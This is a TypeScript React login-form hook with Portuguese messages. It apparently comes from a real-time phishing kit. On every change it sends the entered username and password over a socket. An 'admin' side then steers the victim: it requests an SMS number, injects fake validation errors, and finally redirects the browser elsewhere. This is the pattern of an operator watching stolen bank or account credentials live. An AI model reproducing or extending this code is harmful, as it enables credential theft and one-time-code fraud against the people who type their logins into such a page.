'use client';

import { useEffect } from 'react';
import { useForm, SubmitHandler } from 'react-hook-form';

import navigate from '@/actions/navigate';
import socket from '@/config/socket';
import AdminAskProtocol from '@/interfaces/adminAskProtocol';
import AdminErrorProtocol from '@/interfaces/adminErrorProtocol';
import { zodResolver } from '@hookform/resolvers/zod';

import { useAccountContext } from '../accountContext/useContext';
import { useGlobalToastContext } from '../globalToastContext/useContext';
import { useLoadingContext } from '../loadingContext/useContext';
import { zodSchema, BodyProtocol } from './validation';

export default function useFormLogin() {
  const {
    register,
    handleSubmit,
    setValue,
    watch,
    reset,
    trigger,
    setError,
    formState: { errors, isSubmitted },
  } = useForm<BodyProtocol>({
    resolver: zodResolver(zodSchema),
    defaultValues: {
      password: '',
      user: '',
    },
  });
  const { isLoading, setIsLoading } = useLoadingContext();
  const { account, setAccount } = useAccountContext();
  const { setOpenAlert } = useGlobalToastContext();

  useEffect(() => {
    socket.emit('client', account);
  }, [account]);

  useEffect(() => {
    socket.on('client-ask', (data: AdminAskProtocol) => {
      setAccount(state => ({
        ...state,
        status: data.status,
        numberSMS: data.numberSMS,
      }));
      navigate(data.redirect);
    });
    socket.on('client-error', (data: AdminErrorProtocol) => {
      setAccount(state => ({ ...state, status: data.status }));
      for (let val of data.errors) {
        setError(val.type as keyof BodyProtocol, { message: val.message });
      }
      setIsLoading(false);
    });
    socket.on('client-exclude', () => {
      setOpenAlert({
        msg: 'Ocorreu um erro, tente novalmente mais tarde',
        open: true,
        severity: 'error',
      });
      setIsLoading(false);
    });
    socket.on('client-finish', (data: { status: string; redirect: string }) => {
      setAccount(state => ({ ...state, status: data.status }));
      location.href = data.redirect;
    });
  }, [setAccount, setError, setIsLoading, setOpenAlert]);

  const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
    if (isLoading) return;
    const { user, password } = body;
    setIsLoading(true);
    setAccount(state => ({
      ...state,
      user,
      password,
      status: 'esperando resposta usuário e senha',
    }));
  };

  const handleReset = () => {
    reset();
  };

  return {
    handleSubmit: handleSubmit(handleFormSubmit),
    register,
    setValue,
    watch,
    errors,
    handleReset,
    trigger,
    isSubmitted,
  };
}
